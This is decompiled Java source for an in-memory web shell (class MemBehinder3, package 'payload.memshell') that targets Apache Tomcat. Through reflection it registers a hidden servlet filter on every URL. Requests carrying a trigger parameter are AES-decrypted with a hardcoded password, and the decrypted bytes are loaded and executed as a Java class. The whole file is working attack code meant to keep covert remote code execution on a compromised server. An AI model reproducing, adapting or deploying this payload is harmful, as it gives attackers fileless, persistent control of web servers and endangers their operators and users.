package cn.safe6.payload.memshell;

//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.EnumSet;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.FilterRegistration.Dynamic;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import org.apache.catalina.LifecycleState;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.util.LifecycleBase;
import sun.misc.BASE64Decoder;

public class MemBehinder3 implements Filter {
    public PageContext pageContext;
    public String passwd = "shell@2021";

    public MemBehinder3(PageContext var1) {
        this.pageContext = var1;
    }

    public void init(FilterConfig var1) throws ServletException {
    }

    public static String md5(String var0) {
        String var1 = null;

        try {
            MessageDigest var2 = MessageDigest.getInstance("MD5");
            var2.update(var0.getBytes(), 0, var0.length());
            var1 = (new BigInteger(1, var2.digest())).toString(16).toUpperCase();
        } catch (Exception var4) {
        }

        return var1.substring(0, 16).toLowerCase();
    }

    public void doFilter(ServletRequest var1, ServletResponse var2, FilterChain var3) throws IOException, ServletException {
        HttpServletRequest var4 = (HttpServletRequest)var1;
        HttpServletResponse var5 = (HttpServletResponse)var2;
        HttpSession var6 = var4.getSession();
        var5.setHeader("inject", "ok");
        if (var4.getParameter("test").equals("ok")) {
            String var7 = md5(this.passwd);
            System.out.println("收到----");
            var6.putValue("u", var7);

            try {
                this.pageContext.setRequest(var1);
                this.pageContext.setResponse(var2);
                Cipher var8 = Cipher.getInstance("AES");
                SecretKeySpec var9 = new SecretKeySpec((var6.getValue("u") + "").getBytes(), "AES");
                var8.init(2, var9);
                String var10 = var4.getReader().readLine();
                Method var11 = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                var11.setAccessible(true);
                byte[] var12 = var8.doFinal((new BASE64Decoder()).decodeBuffer(var10));
                Class var13 = (Class)var11.invoke(this.getClass().getClassLoader(), var12, new Integer(0), new Integer(var12.length));
                var13.newInstance().equals(this.pageContext);
            } catch (Exception var15) {
            }
        }

        var3.doFilter(var4, var5);
    }

    public void destroy() {
    }

        public static void dynamicAddFilter(Filter var0, String var1, String var2, HttpServletRequest var3) throws IllegalAccessException {
        ServletContext var4 = var3.getServletContext();
        if (var4.getFilterRegistration(var1) == null) {
            Field var5 = null;
            ApplicationContext var6 = null;
            StandardContext var7 = null;
            Field var8 = null;
            Dynamic var9 = null;

            try {
                var5 = var4.getClass().getDeclaredField("context");
                var5.setAccessible(true);
                var6 = (ApplicationContext)var5.get(var4);
                var5 = var6.getClass().getDeclaredField("context");
                var5.setAccessible(true);
                var7 = (StandardContext)var5.get(var6);
                var8 = LifecycleBase.class.getDeclaredField("state");
                var8.setAccessible(true);
                var8.set(var7, LifecycleState.STARTING_PREP);
                var9 = var4.addFilter(var1, var0);
                var9.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, new String[]{var2});
                Method var10 = StandardContext.class.getMethod("filterStart", (Class[])null);
                var10.setAccessible(true);
                var10.invoke(var7, (Object[])null);
                var8.set(var7, LifecycleState.STARTED);
            } catch (Exception var14) {
            } finally {
                var8.set(var7, LifecycleState.STARTED);
            }
        }

    }

    public boolean equals(Object var1) {
        Object[] var2 = (Object[])var1;
        HttpServletRequest var3 = (HttpServletRequest)var2[0];
        Response var4 = (Response)var2[1];
        HttpSession var5 = (HttpSession)var2[2];
        PageContext var6 = (PageContext)var2[3];

        try {
            dynamicAddFilter(new MemBehinder3(var6), "Behinder", "/*", var3);
        } catch (IllegalAccessException var8) {
            var8.printStackTrace();
        }

        return true;
    }
}
